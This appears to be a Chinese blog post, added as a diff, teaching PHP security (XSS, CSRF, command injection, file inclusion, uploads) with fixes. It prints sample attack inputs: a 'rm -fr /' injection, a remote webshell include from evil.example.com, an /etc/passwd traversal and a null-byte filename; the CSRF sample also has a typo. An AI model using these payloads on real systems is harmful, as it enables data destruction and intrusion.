@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><head>
+    <meta name="google-site-verification" content="9vIieCe-Qpd78QOmBl63rGtIVbhY6sYyuxX3j8XWBA4" />
+    <meta name="baidu-site-verification" content="LRrmH41lz7" />
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <meta name="description" content="安全">
+    
+    <meta name="keyword"  content="Redis, Go, 微服务, PHP, Git, Bash">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>PHP专业笔记（一百零一）-怀府风的博客 | Arvin&#39;s Blog</title>
+
+    <link rel="canonical" href="/2019/07/post/php-section-101.html">
+
+    <link rel="stylesheet" href="/css/iDisqus.min.css"/>
+	
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    
+    <link rel="stylesheet" href="/css/syntax.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    
+    
+    <script src="/js/jquery.min.js"></script>
+    
+    
+    <script src="/js/bootstrap.min.js"></script>
+    
+    
+    <script src="/js/hux-blog.min.js"></script>
+</head>
+</head>
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">怀府小阁</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">首页</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/algorithms">algorithms</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/go">go</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/java">java</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/php">php</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/%E5%B7%A5%E5%85%B7">工具</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93">数据库</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/%E9%9A%8F%E7%AC%94">随笔</a>
+                    </li>
+                    
+
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/head_bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                       
+                       <a class="tag" href="/tags/php" title="PHP">
+                           PHP
+                        </a>
+                       
+                    </div>
+                    <h1>PHP专业笔记（一百零一）</h1>
+                    <h2 class="subheading"></h2>
+                    <span  class="meta">Posted by 怀府风 on Wednesday, July 10, 2019
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+        		
+                        <header>
+                        <h2>TOC</h2>
+                        </header>
+                        <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#安全">安全</a>
+<ul>
+<li><a href="#1-php版本泄露">1. PHP版本泄露</a></li>
+<li><a href="#2-跨站脚本-xss">2. 跨站脚本(XSS)</a></li>
+<li><a href="#3-跨站请求伪造">3. 跨站请求伪造</a></li>
+<li><a href="#4-命令行注入">4. 命令行注入</a></li>
+<li><a href="#5-移除标签">5. 移除标签</a></li>
+<li><a href="#6-文件包含">6. 文件包含</a></li>
+<li><a href="#7-错误报告">7. 错误报告</a></li>
+<li><a href="#8-上传文件">8. 上传文件</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+        		
+        		
+
+<h2 id="安全">安全</h2>
+
+<p>由于大多数网址使用PHP，因此应用安全性是PHP开发人员保护其网站、数据和客户端的一个重要主题。本主题主要介绍PHP中的最佳安全事件，以及PHP修复的常见漏洞和弱点。</p>
+
+<h3 id="1-php版本泄露">1. PHP版本泄露</h3>
+
+<p>默认情况下，PHP会告诉世界当前你使用的PHP版本：</p>
+
+<pre><code>X-Powered-By: PHP/5.3.8
+</code></pre>
+
+<p>要修复这个你需要修改php.ini中的配置：</p>
+
+<pre><code>expose_php = off
+</code></pre>
+
+<p>或者修改这个头信息：</p>
+
+<pre><code>header(&quot;X-Powered-By: Magic&quot;);
+</code></pre>
+
+<p>或者你使用一个htaccess方法：</p>
+
+<pre><code>Header unset X-Powered-By
+</code></pre>
+
+<p>如果上面的方法都没有效果，有一个<a href="https://www.php.net/header_remove">header_remove()</a>函数可以用来删除头：</p>
+
+<pre><code>header_remove(&quot;X-Powered-By&quot;);
+</code></pre>
+
+<p>如果攻击者知道你使用的是PHP和你使用的PHP版本，那么他们很容易攻击你的服务器。</p>
+
+<h3 id="2-跨站脚本-xss">2. 跨站脚本(XSS)</h3>
+
+<p><strong>问题</strong></p>
+
+<p>跨站脚本是web客户端意外执行远程代码。如果任何Web应用程序从用户处获得输入并直接在网页上输出，那么它可能向XSS公开自己。如果输入包含HTML或JavaScript，当这些内容被显示在客户端上时，远程的代码可能被执行。</p>
+
+<p>例如，如果一个第三方包含一个JavaScript文件：</p>
+
+<pre><code>// http://example.com/runme.js
+document.write(&quot;我在运行&quot;);
+</code></pre>
+
+<p>一个PHP程序直接把一个字符串输出到客户端：</p>
+
+<pre><code class="language-php">&lt;?php
+echo &quot;&lt;div&gt;&quot; . $_GET['input'] . &quot;&lt;/div&gt;&quot;;
+</code></pre>
+
+<p>如果一个没有检查的GET参数包含<code>&lt;script src=&quot;http://example.com/runme.js&quot;&gt;&lt;/script&gt;</code>，那么PHP脚本的输出就是：</p>
+
+<pre><code>&lt;div&gt;&lt;script src=&quot;http://example.com/runme.js&quot;&gt;&lt;/script&gt;&lt;/div&gt;
+</code></pre>
+
+<p>第三方的JavaScript将会执行，用户会在web页面上面看到&rdquo;我在运行&rdquo;。</p>
+
+<p><strong>解决</strong></p>
+
+<p>不信任任何客户端的输入，这是一个基本规则。每个GET，POST，cookie的值都可能是任何内容，都应该进行验证。当输出这些值的时候，进行转义，避免这些内容以不希望的方式执行。</p>
+
+<p>请记住，即使最简单的应用中，数据也可以移动，很难追踪所有来源。因此最后始终转义输出。</p>
+
+<p>PHP提供了一些方法来根据环境转义输出内容。</p>
+
+<p><strong>过滤函数</strong></p>
+
+<p><strong>PHP过滤函数</strong>运行输入到PHP脚本的数据在<a href="https://www.php.net/manual/zh/filter.filters.php">很多类型</a>中是<a href="https://www.php.net/manual/zh/filter.filters.sanitize.php">净化的</a>，<a href="https://www.php.net/manual/zh/filter.filters.validate.php">有效的</a>。他们在保存或输出客户端输入时很有效果。</p>
+
+<p><strong>HTML加密</strong></p>
+
+<p><code>htmlspecialchars</code>将会转换任何<code>HTML特殊字符</code>为其HTML编码，这意味着他们将不会作为标准HTML进行处理。用这个方法修复之前的问题：</p>
+
+<pre><code class="language-php">&lt;?php
+echo '&lt;div&gt;' . htmlspecialchars($_GET['input']) . '&lt;/div&gt;';
+// or
+echo '&lt;div&gt;' . filter_input(INPUT_GET, 'input', FILTER_SANITIZE_SPECIAL_CHARS) . '&lt;/div&gt;';
+</code></pre>
+
+<p>将会输出：</p>
+
+<pre><code>&lt;div&gt;&amp;lt;script src=&amp;quot;http://example.com/runme.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/div&gt;
+</code></pre>
+
+<p><code>&lt;div&gt;</code>中的每个内容都不会被浏览器解析为一个JavaScript标签，而只是作为文本输出。用户只会看到：</p>
+
+<pre><code>&lt;script src=&quot;http://example.com/runme.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+
+<p><strong>URL加密</strong></p>
+
+<p>当输出动态生成的URL时，PHP提供了<code>urlencode</code>函数来输出安全有效的URL。所以，如果一个用户可以输入作为URL的任何GET参数：</p>
+
+<pre><code class="language-php">&lt;?php
+$input = urlencode($_GET['input']);
+// or
+$input = filter_input(INPUT_GET, 'input', FILTER_SANITIZE_URL);
+echo '&lt;a href=&quot;http://example.com/page?input=&quot;' . $input . '&quot;&gt;Link&lt;/a&gt;';
+</code></pre>
+
+<p>任何恶意输入将会转换为编码的URL参数。</p>
+
+<p><strong>使用专门的外部库或OWASP反序列化列表</strong></p>
+
+<p>有时候你想要发送HTMl或其他类型的输入。你需要维护一个授权单词列表(白名单)和未授权单词列表(黑名单)。</p>
+
+<p>你可以下载<a href="https://www.owasp.org/index.php/Category:OWASP_AntiSamy_Project">OWASP AntiSamy网站</a>提供的有效标准列表。每个列表都适合特定类型的交互（易趣API、Tinymce等）。它是开源的。</p>
+
+<p>有一些库可以过来HTML，防范一般情况下的XSS攻击，并非常简单的使用至少AntiSamy列表。例如<a href="http://htmlpurifier.org/">HTML Purifier</a>。</p>
+
+<h3 id="3-跨站请求伪造">3. 跨站请求伪造</h3>
+
+<p><strong>问题</strong></p>
+
+<p>跨站脚本攻击或<code>CSRF</code>可以强制最终用户在不知情的情况下像web服务器发送恶意请求。这种攻击向量可以在POST和GET请求中使用。比如地址<code>/delete.php?accnt=12</code>删除GET请求中<code>accnt</code>参数传入的账号。现在，如果经过身份验证的用户在任何其他应用程序中遇到以下脚本:</p>
+
+<pre><code>&lt;img src=&quot;http://domain.com/delete.php?accnt=12&quot; width=&quot;0&quot; height=&quot;0&quot; border=&quot;0&quot;&gt;
+</code></pre>
+
+<p>这个账号就会被删除。</p>
+
+<p><strong>解决</strong></p>
+
+<p>一个常用的解决这个问题的办法是CSRF token。CSRF token嵌套在请求中，这样web应用可以信任这个请求，认为这个请求来自于应用流程中的请求。首先用户执行一些操作，比如查看表单，这会触发产生一个唯一的token。下面是一个实现这个的例子：</p>
+
+<pre><code>&lt;form method=&quot;get&quot; action=&quot;/delete.php&quot;&gt;
+  &lt;input type=&quot;text&quot; name=&quot;accnt&quot; placeholder=&quot;accnt number&quot; /&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;&lt;randomToken&gt;&quot; /&gt;
+  &lt;input type=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+</code></pre>
+
+<p>这个token可以让服务端用来验证用户的请求是不是一个恶意请求。</p>
+
+<p><strong>例子</strong></p>
+
+<p>下面是简单实现的一个示例代码：</p>
+
+<pre><code class="language-php">//产生并存储CSRF token
+...
+&lt;?php
+    session_start();
+    function generate_token() {
+        //检查当前会话是否存在一个token
+        if (!isset($_SESSION['csrf_token'])) {
+            //没有生成一个新的
+            $token = random_bytes(64);
+            $_SESSION['csrf_token'] = $token;
+        } else {
+            //重用这个token
+            $token = $_SESSION['csrf_tokne'];
+        }
+        
+        return $token;
+    }
+?&gt;
+&lt;body&gt;
+    &lt;form method=&quot;get&quot; action=&quot;/delete.php&quot;&gt;
+        &lt;input type=&quot;text&quot; name=&quot;accnt&quot; placeholder=&quot;accnt number&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;&lt;?php echo generate_token();&quot;?&gt; /&gt;
+        &lt;input type=&quot;submit&quot; /&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+...
+
+//验证token 并且丢掉恶意请求
+&lt;?php
+    session_start();
+    if ($_GET['csrf_token'] != $_SESSION['csrf_token']) {
+        unset($_SESSION['csrf_token']);
+        die(&quot;CSRF token验证失败&quot;);
+    }
+?&gt;
+...
+</code></pre>
+
+<p>有很多库和框架已经实现了自己的CSRF验证。虽然这是最简单的CSRF的实现，但是你需要实现动态生成你的CSRF token的功能，避免CSRF token被窃取和固化。</p>
+
+<h3 id="4-命令行注入">4. 命令行注入</h3>
+
+<p><strong>问题</strong></p>
+
+<p>和SQL注入允许攻击者在数据库上面执行任意的查询，命令行注入允许用户在web服务器上面执行不可信的系统命令。对于安全不正确的服务器，这将使攻击者能够完全控制系统。</p>
+
+<p>例如，一个脚本允许用户列出服务器上面的目录内容：</p>
+
+<pre><code class="language-php">&lt;pre&gt;
+&lt;?php system('ls ' . $_GET['path']); ?&gt;
+&lt;/pre&gt;
+</code></pre>
+
+<p>真实场景下，会使用PHP内建的函数或对象来获取路径内容。这个例子只是简单安全介绍。</p>
+
+<p>这个<code>path</code>希望是<code>/tmp</code>这样的结构。但是这里任何都是允许的，<code>path</code>可以是<code>;rm -fr /</code>。web服务器将会执行下面的命令：</p>
+
+<pre><code>ls; rm -fr /
+</code></pre>
+
+<p>这将会删除服务器根目录的所有文件。</p>
+
+<p><strong>解决：</strong></p>
+
+<p>所有命令的参数必须转义的，使用<code>escapeshellarg()</code>或<code>escapeshellcmd()</code>。这将保证参数是不可执行的。对每个参数，这个输入值都应该进行验证。</p>
+
+<p>我们可以对上面的例子进行下面的处理：</p>
+
+<pre><code class="language-php">&lt;pre&gt;
+&lt;?php system('ls ' . escapeshellarg($_GET['path'])); ?&gt; 
+&lt;/pre&gt;
+</code></pre>
+
+<p>像之前一样，使用删除文件的命令，这个将会执行下面的命令：</p>
+
+<pre><code>ls '; rm -fr /'
+</code></pre>
+
+<p>这样这个字符串只会简单的传给<code>ls</code>，作为其的参数，而不是在<code>ls</code>命令之后在执行<code>rm</code>命令。</p>
+
+<p>现在我们已经修复了上面的安全问题，但是并不是递归目录。想要修复这个问题的话，需要检查这个path是以希望的目录开始的。</p>
+
+<p>PHP提供有多个函数来执行系统的命令，包括<code>exec</code>，<code>passthru</code>，<code>proc_open</code>，<code>shell_exec</code>和<code>system</code>。所有他们的输入都需要做验证和转义。</p>
+
+<h3 id="5-移除标签">5. 移除标签</h3>
+
+<p><code>strip_tags</code>如果你知道怎么使用的话，这是一个功能强大的接口。用来解决跨站脚本攻击的话有更多好的方法，像字符加密，但是这个方法在某些情况下很好用。</p>
+
+<p><strong>基础例子</strong></p>
+
+<pre><code class="language-php">$string = '&lt;b&gt;Hello,&lt;&gt; please remove the &lt;&gt; tags.&lt;/b&gt;';
+echo strip_tags($string);
+</code></pre>
+
+<p><strong>原始输出</strong></p>
+
+<pre><code>Hello, please remove the tags.
+</code></pre>
+
+<p><strong>运行标签</strong></p>
+
+<p>如果你需要允许某些标签，但是禁止别的标签，你可以在这个函数中传入第二个参数。这个参数是可选的。在这个例子中，只允许<code>&lt;b&gt;</code>标签。</p>
+
+<pre><code class="language-php">$string = '&lt;b&gt;Hello,&lt;&gt; please remove the &lt;br&gt; tags.&lt;/b&gt;';
+echo strip_tags($string, '&lt;b&gt;');
+</code></pre>
+
+<p><strong>原始输出</strong></p>
+
+<pre><code>&lt;b&gt;Hello, please remove the tags.&lt;/b&gt;
+</code></pre>
+
+<p><strong>注意</strong></p>
+
+<p><code>HTML</code>注释和<code>PHP</code>注释也被移除了。这里是硬编码的，不能使用allowed_tags修改。</p>
+
+<p>在PHP 5.3.4之后，allowed_tags中自关闭的标签是被忽视的，只有非自关闭的标签有效。例如，想要允许<code>&lt;br&gt;</code>和<code>&lt;br/&gt;</code>，你可以使用:</p>
+
+<pre><code>&lt;?php
+    strip_tags($input, '&lt;br&gt;'); 
+?&gt;
+</code></pre>
+
+<h3 id="6-文件包含">6. 文件包含</h3>
+
+<p><strong>远程文件包含</strong></p>
+
+<p>远程文件包含(RFI)是一种允许攻击者包含远程文件的漏洞。</p>
+
+<p>这个例子插入包含恶意代码的远程托管文件。</p>
+
+<pre><code class="language-php">&lt;?php
+include $_GET['page'];
+</code></pre>
+
+<blockquote>
+<p>/vulnerable.php?page=<a href="http://evil.example.com/webshell.txt?">http://evil.example.com/webshell.txt?</a></p>
+</blockquote>
+
+<p><strong>本地文件包含</strong></p>
+
+<p>本地文件包含(LFI)通过浏览器在服务器上面包含文件的过程。</p>
+
+<pre><code class="language-php">&lt;?php
+$page = 'pages/'.$_GET['page'];
+if(isset($page)) {
+    include $page;
+} else {
+    include 'index.php';
+}
+</code></pre>
+
+<blockquote>
+<p>/vulnerable.php?page=../../../../etc/passwd</p>
+</blockquote>
+
+<p><strong>RFI&amp;LFI的解决办法</strong></p>
+
+<p>建议仅允许包含你批准的文件，并仅限于这些文件。</p>
+
+<pre><code class="language-php">&lt;?php
+$page = 'pages/'.$_GET['page'].'.php';
+$allowed = ['pages/home.php','pages/error.php'];
+if(in_array($page,$allowed)) {
+    include($page);
+} else {
+    include('index.php');
+}
+</code></pre>
+
+<h3 id="7-错误报告">7. 错误报告</h3>
+
+<p>默认情况下当脚本遇到不希望的错误时，将会直接在页面上输出错误，警告，注意。一方面这是解决脚本问题的有效方法，另一方面这将会将不希望的信息输出到用户面前。</p>
+
+<p>因此，最好避免显示那些将显示有关服务器信息的消息，例如在生产环境中显示目录树。在开发或测试环境中，为了调试目的显示这些消息可能仍然有用。</p>
+
+<p><strong>快速解决</strong></p>
+
+<p>你可以简单的禁止信息的显示，但是这样你调试脚本问题就很麻烦了。</p>
+
+<pre><code>&lt;?php
+ini_set(&quot;display_errors&quot;, &quot;0&quot;); 
+?&gt;
+</code></pre>
+
+<p>或者直接修改php.ini：</p>
+
+<pre><code>display_errors = 0
+</code></pre>
+
+<p><strong>处理错误</strong></p>
+
+<p>一个更好的选择是把错误信息存储到某个地方，比如数据库：</p>
+
+<pre><code>set_error_handler(function($errno , $errstr, $errfile, $errline){ 
+    try{
+    $pdo = new PDO(&quot;mysql:host=hostname;dbname=databasename&quot;, 'dbuser', 'dbpwd', [      
+        PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION
+    ]);
+    
+    if($stmt = $pdo-&gt;prepare(&quot;INSERT INTO `errors` (no,msg,file,line) VALUES (?,?,?,?)&quot;)){ 
+        if(!$stmt-&gt;execute([$errno, $errstr, $errfile, $errline])) {
+            throw new Exception('Unable to execute query'); }
+    } else {
+        throw new Exception('Unable to prepare query');
+    }
+  } catch (Exception $e){
+    error_log('Exception: ' . $e-&gt;getMessage() . PHP_EOL . &quot;$errfile:$errline:$errno | $errstr&quot;); 
+    }
+});
+</code></pre>
+
+<p>此方法将把消息记录到数据库中，如果文件失败，而不是直接将其回送到页面中。通过这种方式，您可以跟踪用户在您的网站上遇到的问题，并在出现问题时立即通知您。</p>
+
+<h3 id="8-上传文件">8. 上传文件</h3>
+
+<p>如果您希望用户将文件上载到您的服务器，您需要在将上载的文件实际移动到Web目录之前进行一些安全检查。</p>
+
+<p><strong>上传数据</strong></p>
+
+<p>这个数组包含用户上传的数据，不是文件本身的数据。虽然通常这些数据是由浏览器生成的，但是可以使用软件轻松地向同一表单发出POST请求。</p>
+
+<pre><code>$_FILES['file']['name'];
+$_FILES['file']['type'];
+$_FILES['file']['size'];
+$_FILES['file']['tmp_name'];
+</code></pre>
+
+<ul>
+<li><code>name</code> - 验证它的每个方面</li>
+<li><code>type</code> - 不要使用此数据。它可以通过使用PHP函数来获取。</li>
+<li><code>size</code> - 安全使用</li>
+<li><code>tmp_name</code> - 安全使用</li>
+</ul>
+
+<p><strong>利用文件名</strong></p>
+
+<p>通常，操作系统不允许在文件名中使用特定的字符，但通过欺骗请求，可以添加这些字符，从而允许发生意外事件。例如，让我们命名文件：</p>
+
+<p><code>../script.php%00.png</code></p>
+
+<p>仔细看看这个文件名，你可以看到一些事情：</p>
+
+<ol>
+<li>首先注意到<code>../</code>，在文件名中是完全非法的，同时如果您要将文件从一个目录移动到另一个目录中，这是完全正确的？</li>
+<li>现在，您可能认为您在脚本中正确地验证了文件扩展名，但此漏洞依赖于URL解码，将<code>%00</code>转换为<code>null</code>，基本上是对操作系统说，该字符串到此结束，从文件名中剥离<code>.png</code>。</li>
+</ol>
+
+<p>所以现在我已经把<code>script.php</code>上传到另一个目录，通过文件扩展名传递简单的验证。也可以通过<code>.htaccess</code>文件不允许从上传目录执行脚本。</p>
+
+<p><strong>安全获取文件名和扩展</strong></p>
+
+<p>你可以使用<code>pathinfo()</code>以安全的方式推断和扩展名，但收效需要替换文件名中不需要的字符：</p>
+
+<pre><code class="language-php">// This array contains a list of characters not allowed in a filename
+$illegal = array_merge(array_map('chr', range(0,31)), [&quot;&lt;&quot;, &quot;&gt;&quot;, &quot;:&quot;, '&quot;', &quot;/&quot;, &quot;\\&quot;, &quot;|&quot;, &quot;?&quot;, &quot;*&quot;, &quot; &quot;]);
+$filename = str_replace($illegal, &quot;-&quot;, $_FILES['file']['name']);
+
+$pathinfo  = pathinfo($filename);
+$extension = $pathinfo['extension'] ? $pathinfo['extension']:'';
+$filename  = $pathinfo['filename']  ? $pathinfo['filename']:'';
+
+if(!empty($extension) &amp;&amp; !empty($filename)){
+  echo $filename, $extension;
+} else {
+  die('file is missing an extension or name');
+}
+</code></pre>
+
+<p>现在我们获得了可以用来存储的文件名和扩展，我喜欢将信息存储到数据库，并为文件生成一个名称，例如<code>md5(uniqid().microtime())</code></p>
+
+<pre><code>+----+--------+-----------+------------+------+----------------------------------+---------------------+
+| id | title  | extension | mime       | size | filename                         | time
+|
++----+--------+-----------+------------+------+----------------------------------+---------------------+
+| 1  | myfile | txt       | text/plain | 1020 | 5bcdaeddbfbd2810fa1b6f3118804d66 | 2017-03-11
+00:38:54 |
++----+--------+-----------+------------+------+----------------------------------+---------------------+
+</code></pre>
+
+<p>这将解决文件名重复和文件名中不可见漏洞的问题。它还将导致攻击者猜测该文件存储在何处，因为他或她无法专门针对该文件执行。</p>
+
+<p><strong>MIME类型验证</strong></p>
+
+<p>检查文件扩展来判断是什么文件这是不够的，例如文件名可能是<code>image.png</code>，但是包含一个PHP脚本。通过在文件扩展名上验证文件的mime-type类型，可以验证文件是否其包含名称指定的内容。</p>
+
+<p>你甚至可以进一步验证图像，这实际是打开它们：</p>
+
+<pre><code class="language-php">if($mime == 'image/jpeg' &amp;&amp; $extension == 'jpeg' || $extension == 'jpg'){
+  if($img = imagecreatefromjpeg($filename)){
+    imagedestroy($img);
+  } else {
+    die('image failed to open, could be corrupt or the file contains something else.');
+  }
+}
+</code></pre>
+
+<p>你可以使用内建的<a href="https://www.php.net/manual/zh/function.mime-content-type.php">函数</a>或<a href="https://www.php.net/manual/zh/book.fileinfo.php">类</a>获取mime-type。</p>
+
+<p><strong>上传白名单</strong></p>
+
+<p>最重要的是，您应该根据每个表单列出文件扩展名和mime类型。</p>
+
+<pre><code class="language-php">function isFiletypeAllowed($extension, $mime, array $allowed) {
+    return  isset($allowed[$mime]) &amp;&amp;
+            is_array($allowed[$mime]) &amp;&amp;
+            in_array($extension, $allowed[$mime]);
+}
+$allowedFiletypes = [
+    'image/png'  =&gt; [ 'png' ],
+    'image/gif'  =&gt; [ 'gif' ],
+    'image/jpeg' =&gt; [ 'jpg', 'jpeg' ],
+];
+var_dump(isFiletypeAllowed('jpg', 'image/jpeg', $allowedFiletypes));
+</code></pre>
+
+<p>参考：<a href="https://goalkicker.com/PHPBook">PHP® Notes for Professionals book</a></p>
+
+        
+                
+        
+              <hr>
+              <ul class="pager">
+                  
+                  <li class="previous">
+                      <a href="/2019/07/post/php-section-100.html" data-toggle="tooltip" data-placement="top" title="PHP专业笔记（一百）">&larr; Previous Post</a>
+                  </li>
+                  
+                  
+                  <li class="next">
+                      <a href="/2019/07/post/php-section-102.html" data-toggle="tooltip" data-placement="top" title="PHP专业笔记（一百零二）">Next Post &rarr;</a>
+                  </li>
+                  
+              </ul>
+  
+              
+<div id="disqus-comment"></div>
+
+
+
+            </div>
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">特色标签</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        <a href="/tags/algorithms" title="algorithms">
+                        algorithms
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/bash" title="bash">
+                        bash
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/git" title="git">
+                        git
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/go" title="go">
+                        go
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/hugo" title="hugo">
+                        hugo
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/java" title="java">
+                        java
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/mysql" title="mysql">
+                        mysql
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/php" title="php">
+                        php
+                        </a>
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                   
+                    
+                    
+                    
+                    
+                    
+
+                    
+
+		    
+                    
+                    
+                    
+                    
+                </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; 怀府小阁 , 2019
+                    <br>
+
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        async("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    async("https://cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+<script>
+    
+    var _baId = '60e88bb5add74ae0f8d6971f23b916ce';
+
+    
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+
+
+</body>
+</html>
